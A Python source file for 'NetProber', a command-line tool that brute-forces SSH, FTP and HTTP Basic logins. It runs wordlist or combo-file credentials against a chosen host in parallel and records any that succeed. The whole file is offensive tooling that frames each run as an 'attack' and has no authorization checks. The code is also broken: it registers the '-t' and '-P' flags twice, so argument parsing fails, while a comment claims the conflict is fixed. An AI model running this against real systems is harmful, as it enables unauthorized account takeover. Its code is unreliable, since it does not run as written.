#!/usr/bin/env python3

import argparse
import asyncio
import concurrent.futures
import itertools
import logging
import os
import socket
import ssl
import sys
import threading
import time
from abc import ABC, abstractmethod
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple

try:
    import aiohttp
    import asyncssh
except ImportError:
    print("Error: Missing required dependencies. Install with:")
    print("pip install aiohttp asyncssh")
    sys.exit(1)

# ====================================================================
# CORE DATA STRUCTURES
# ====================================================================

class Credential:
    """Simple credential container"""
    
    def __init__(self, username: str, password: str):
        self.username = username
        self.password = password
    
    def __str__(self) -> str:
        return f"{self.username}:{self.password}"
    
    def __repr__(self) -> str:
        return self.__str__()


class Target:
    """Simple target container"""
    
    def __init__(self, host: str, port: int, protocol: str):
        self.host = host
        self.port = port
        self.protocol = protocol
    
    def __str__(self) -> str:
        return f"{self.host}:{self.port} ({self.protocol})"
    
    def __repr__(self) -> str:
        return self.__str__()


class Result:
    """Authentication attempt result"""
    
    def __init__(self, target: Target, credential: Credential, 
                 success: bool, response_time: float, message: str = ""):
        self.target = target
        self.credential = credential
        self.success = success
        self.response_time = response_time
        self.message = message
        self.timestamp = datetime.now()
    
    def __str__(self) -> str:
        status = "SUCCESS" if self.success else "FAILED"
        return (f"[{self.timestamp.strftime('%H:%M:%S')}] [{status}] {self.target} - "
                f"{self.credential} - {self.response_time:.2f}s - {self.message}")


# ====================================================================
# PROTOCOL MODULES
# ====================================================================

class ProtocolModule(ABC):
    """Base class for protocol modules"""
    
    @abstractmethod
    async def authenticate(self, target: Target, credential: Credential, 
                          timeout: int = 10) -> Result:
        """Authenticate with the target using the provided credential"""
        pass
    
    @abstractmethod
    def get_default_port(self) -> int:
        """Get the default port for this protocol"""
        pass


class SSHModule(ProtocolModule):
    """SSH authentication module"""
    
    async def authenticate(self, target: Target, credential: Credential, 
                          timeout: int = 10) -> Result:
        start_time = time.time()
        success = False
        message = ""
        
        try:
            # Attempt SSH connection
            async with asyncssh.connect(
                host=target.host,
                port=target.port,
                username=credential.username,
                password=credential.password,
                known_hosts=None,
                login_timeout=timeout
            ) as conn:
                # Run a simple command to verify successful login
                result = await conn.run("echo NetProber", check=True)
                if result.exit_status == 0:
                    success = True
                    message = "Authentication successful"
                else:
                    message = f"Command failed with exit status {result.exit_status}"
                    
        except asyncssh.DisconnectError:
            message = "Connection failed"
        except asyncssh.PermissionDenied:
            message = "Authentication failed"
        except asyncssh.HostKeyNotVerifiable:
            message = "Host key verification failed"
        except asyncssh.ConnectionLost:
            message = "Connection lost"
        except asyncssh.TimeoutError:
            message = "Connection timed out"
        except Exception as e:
            message = f"Error: {str(e)}"
        
        duration = time.time() - start_time
        return Result(target, credential, success, duration, message)
    
    def get_default_port(self) -> int:
        return 22


class FTPModule(ProtocolModule):
    """FTP authentication module"""
    
    async def authenticate(self, target: Target, credential: Credential, 
                          timeout: int = 10) -> Result:
        start_time = time.time()
        success = False
        message = ""
        
        try:
            # Simple FTP connection using asyncio
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target.host, target.port), 
                timeout=timeout
            )
            
            # Read banner
            banner = await asyncio.wait_for(reader.readline(), timeout=5)
            if not banner.startswith(b'220'):
                message = "Invalid FTP banner"
            else:
                # Send USER command
                writer.write(f"USER {credential.username}\r\n".encode())
                await writer.drain()
                
                response = await asyncio.wait_for(reader.readline(), timeout=5)
                
                if response.startswith(b'331'):  # Need password
                    # Send PASS command
                    writer.write(f"PASS {credential.password}\r\n".encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.readline(), timeout=5)
                    
                    if response.startswith(b'230'):  # Login successful
                        success = True
                        message = "Authentication successful"
                    else:
                        message = "Authentication failed"
                elif response.startswith(b'230'):  # No password needed
                    success = True
                    message = "Authentication successful"
                else:
                    message = "Authentication failed"
            
            writer.close()
            await writer.wait_closed()
            
        except asyncio.TimeoutError:
            message = "Connection timed out"
        except ConnectionRefusedError:
            message = "Connection refused"
        except Exception as e:
            message = f"Error: {str(e)}"
        
        duration = time.time() - start_time
        return Result(target, credential, success, duration, message)
    
    def get_default_port(self) -> int:
        return 21


class HTTPBasicModule(ProtocolModule):
    """HTTP Basic Authentication module"""
    
    async def authenticate(self, target: Target, credential: Credential, 
                          timeout: int = 10) -> Result:
        start_time = time.time()
        success = False
        message = ""
        
        # Determine if HTTPS should be used
        use_ssl = target.port == 443
        scheme = "https" if use_ssl else "http"
        url = f"{scheme}://{target.host}:{target.port}/"
        
        try:
            # Configure SSL context for HTTPS
            ssl_context = None
            if use_ssl:
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
            
            # Create HTTP session with timeout
            timeout_obj = aiohttp.ClientTimeout(total=timeout)
            auth = aiohttp.BasicAuth(credential.username, credential.password)
            
            async with aiohttp.ClientSession(timeout=timeout_obj) as session:
                async with session.get(url, auth=auth, ssl=ssl_context) as response:
                    if response.status == 200:
                        success = True
                        message = "Authentication successful"
                    elif response.status == 401:
                        message = "Authentication failed"
                    else:
                        message = f"HTTP {response.status}"
            
        except aiohttp.ClientConnectorError:
            message = "Connection failed"
        except asyncio.TimeoutError:
            message = "Connection timed out"
        except Exception as e:
            message = f"Error: {str(e)}"
        
        duration = time.time() - start_time
        return Result(target, credential, success, duration, message)
    
    def get_default_port(self) -> int:
        return 80


# ====================================================================
# MAIN ENGINE
# ====================================================================

class NetProber:
    """Main NetProber engine"""
    
    def __init__(self, max_workers: int = 10, delay: float = 0.0):
        self.max_workers = max_workers
        self.delay = delay
        self.logger = logging.getLogger("NetProber")
        
        # Available protocol modules
        self.modules = {
            'ssh': SSHModule(),
            'ftp': FTPModule(),
            'http': HTTPBasicModule(),
            'https': HTTPBasicModule()  # Same module, different default port
        }
        
        # Results storage
        self.results: List[Result] = []
        self.successful_credentials: List[Tuple[Target, Credential]] = []
        self.lock = threading.Lock()
        
        # Progress tracking
        self.total_attempts = 0
        self.completed_attempts = 0
        self.start_time = None
        self.stop_requested = False
        
    def load_wordlist(self, filename: str) -> List[str]:
        """Load wordlist from file"""
        if not os.path.exists(filename):
            self.logger.error(f"File not found: {filename}")
            return []
        
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            self.logger.error(f"Error loading {filename}: {e}")
            return []
    
    def create_credentials(self, usernames: List[str], passwords: List[str]) -> List[Credential]:
        """Create credential combinations"""
        credentials = []
        for username in usernames:
            for password in passwords:
                credentials.append(Credential(username, password))
        return credentials
    
    async def test_single_credential(self, target: Target, credential: Credential, 
                                   timeout: int) -> Result:
        """Test a single credential against a target"""
        # Apply delay if configured
        if self.delay > 0:
            await asyncio.sleep(self.delay)
        
        # Get the appropriate module
        module = self.modules.get(target.protocol)
        if not module:
            return Result(target, credential, False, 0.0, f"Unknown protocol: {target.protocol}")
        
        # Perform authentication
        result = await module.authenticate(target, credential, timeout)
        
        # Store result
        with self.lock:
            self.results.append(result)
            self.completed_attempts += 1
            
            if result.success:
                self.successful_credentials.append((target, credential))
                self.logger.info(f"SUCCESS: {result}")
            
            # Progress update
            if self.completed_attempts % 50 == 0 or result.success:
                progress = (self.completed_attempts / self.total_attempts) * 100
                elapsed = time.time() - self.start_time
                rate = self.completed_attempts / elapsed if elapsed > 0 else 0
                self.logger.info(f"Progress: {progress:.1f}% ({self.completed_attempts}/{self.total_attempts}) - "
                               f"Rate: {rate:.1f}/sec - Successes: {len(self.successful_credentials)}")
        
        return result
    
    async def run_attack(self, target: Target, credentials: List[Credential], 
                        timeout: int = 10) -> List[Result]:
        """Run the main attack"""
        self.logger.info(f"Starting attack on {target}")
        self.logger.info(f"Testing {len(credentials)} credentials")
        
        # Reset counters
        self.results.clear()
        self.successful_credentials.clear()
        self.total_attempts = len(credentials)
        self.completed_attempts = 0
        self.start_time = time.time()
        self.stop_requested = False
        
        # Create semaphore to limit concurrent connections
        semaphore = asyncio.Semaphore(self.max_workers)
        
        async def worker(cred):
            if self.stop_requested:
                return None
            async with semaphore:
                return await self.test_single_credential(target, cred, timeout)
        
        # Execute all authentication attempts
        try:
            tasks = [worker(cred) for cred in credentials]
            await asyncio.gather(*tasks, return_exceptions=True)
        except KeyboardInterrupt:
            self.logger.info("Attack interrupted by user")
            self.stop_requested = True
        
        # Final summary
        elapsed = time.time() - self.start_time
        success_count = len(self.successful_credentials)
        
        self.logger.info(f"Attack completed in {elapsed:.2f} seconds")
        self.logger.info(f"Total attempts: {self.completed_attempts}")
        self.logger.info(f"Successful logins: {success_count}")
        
        if success_count > 0:
            self.logger.info("Successful credentials:")
            for target, cred in self.successful_credentials:
                self.logger.info(f"  {cred}")
        
        return self.results
    
    def save_results(self, filename: str, format_type: str = 'text'):
        """Save results to file"""
        try:
            if format_type.lower() == 'json':
                import json
                data = []
                for result in self.results:
                    data.append({
                        'timestamp': result.timestamp.isoformat(),
                        'target': f"{result.target.host}:{result.target.port}",
                        'protocol': result.target.protocol,
                        'username': result.credential.username,
                        'password': result.credential.password,
                        'success': result.success,
                        'response_time': result.response_time,
                        'message': result.message
                    })
                
                with open(filename, 'w') as f:
                    json.dump(data, f, indent=2)
            
            elif format_type.lower() == 'csv':
                import csv
                with open(filename, 'w', newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow(['Timestamp', 'Target', 'Protocol', 'Username', 
                                   'Password', 'Success', 'Response Time', 'Message'])
                    
                    for result in self.results:
                        writer.writerow([
                            result.timestamp.isoformat(),
                            f"{result.target.host}:{result.target.port}",
                            result.target.protocol,
                            result.credential.username,
                            result.credential.password,
                            'Yes' if result.success else 'No',
                            f"{result.response_time:.2f}",
                            result.message
                        ])
            
            else:  # text format
                with open(filename, 'w') as f:
                    for result in self.results:
                        f.write(f"{result}\n")
            
            self.logger.info(f"Results saved to {filename}")
            
        except Exception as e:
            self.logger.error(f"Error saving results: {e}")


# ====================================================================
# COMMAND LINE INTERFACE
# ====================================================================

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="NetProber - Multi-Protocol Authentication Testing Tool",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    # Target specification
    parser.add_argument("-t", "--target", required=True,
                       help="Target host or IP address")
    parser.add_argument("-p", "--port", type=int,
                       help="Target port (defaults to protocol default)")
    parser.add_argument("-P", "--protocol", required=True,
                       choices=['ssh', 'ftp', 'http', 'https'],
                       help="Protocol to use")
    
    # Authentication options
    auth_group = parser.add_mutually_exclusive_group(required=True)
    auth_group.add_argument("-C", "--combo", 
                           help="File with username:password combinations")
    auth_group.add_argument("-L", "--login", 
                           help="Single username or username list file")
    
    parser.add_argument("-P", "--pass-list", dest="password_list",
                       help="Single password or password list file (required with -L)")
    
    # Performance options
    parser.add_argument("-t", "--tasks", dest="threads", type=int, default=16,
                       help="Number of parallel tasks")
    parser.add_argument("-w", "--wait", type=float, default=0,
                       help="Wait time between attempts (seconds)")
    parser.add_argument("-c", "--timeout", type=int, default=10,
                       help="Connection timeout (seconds)")
    
    # Output options
    parser.add_argument("-o", "--output",
                       help="Output file for results")
    parser.add_argument("-f", "--format", choices=['text', 'json', 'csv'], 
                       default='text', help="Output format")
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Verbose output")
    parser.add_argument("-q", "--quiet", action="store_true",
                       help="Quiet mode (only show successful logins)")
    
    # Fix argument parsing conflict
    args = parser.parse_args()
    
    # Validate arguments
    if hasattr(args, 'login') and args.login and not args.password_list:
        parser.error("-L/--login requires -P/--pass-list")
    
    return args


def setup_logging(verbose: bool = False, quiet: bool = False):
    """Setup logging configuration"""
    if quiet:
        level = logging.WARNING
        format_str = "%(message)s"
    elif verbose:
        level = logging.DEBUG
        format_str = "%(asctime)s [%(levelname)s] %(message)s"
    else:
        level = logging.INFO
        format_str = "%(message)s"
    
    logging.basicConfig(
        level=level,
        format=format_str,
        datefmt="%H:%M:%S"
    )


def load_credentials_from_combo(filename: str) -> List[Credential]:
    """Load credentials from combo file (username:password format)"""
    credentials = []
    
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                if ':' not in line:
                    logging.warning(f"Invalid format on line {line_num}: {line}")
                    continue
                
                username, password = line.split(':', 1)
                credentials.append(Credential(username, password))
    
    except Exception as e:
        logging.error(f"Error loading combo file {filename}: {e}")
        return []
    
    return credentials


def load_from_file_or_value(input_str: str) -> List[str]:
    """Load from file if it exists, otherwise treat as single value"""
    if os.path.exists(input_str):
        try:
            with open(input_str, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            logging.error(f"Error reading file {input_str}: {e}")
            return []
    else:
        return [input_str]


async def main():
    """Main function"""
    args = parse_arguments()
    
    # Setup logging
    setup_logging(args.verbose, args.quiet)
    
    # Create NetProber instance
    prober = NetProber(max_workers=args.threads, delay=args.wait)
    
    # Determine port
    default_ports = {'ssh': 22, 'ftp': 21, 'http': 80, 'https': 443}
    port = args.port if args.port else default_ports.get(args.protocol, 80)
    
    # Create target
    target = Target(args.target, port, args.protocol)
    
    # Load credentials
    credentials = []
    
    if args.combo:
        # Load from combo file
        credentials = load_credentials_from_combo(args.combo)
    elif hasattr(args, 'login') and args.login:
        # Load from separate username/password sources
        usernames = load_from_file_or_value(args.login)
        passwords = load_from_file_or_value(args.password_list)
        
        if not usernames or not passwords:
            logging.error("Failed to load usernames or passwords")
            return 1
        
        credentials = prober.create_credentials(usernames, passwords)
    
    if not credentials:
        logging.error("No credentials loaded")
        return 1
    
    # Run the attack
    try:
        results = await prober.run_attack(target, credentials, args.timeout)
        
        # Save results if requested
        if args.output:
            prober.save_results(args.output, args.format)
        
        # Return appropriate exit code
        return 0 if prober.successful_credentials else 1
        
    except KeyboardInterrupt:
        logging.info("\nAttack interrupted by user")
        
        # Save partial results if requested
        if args.output:
            prober.save_results(args.output, args.format)
        
        return 130
    
    except Exception as e:
        logging.error(f"Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1


if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    
    try:
        exit_code = asyncio.run(main())
        sys.exit(exit_code)
    except KeyboardInterrupt:
        sys.exit(130)
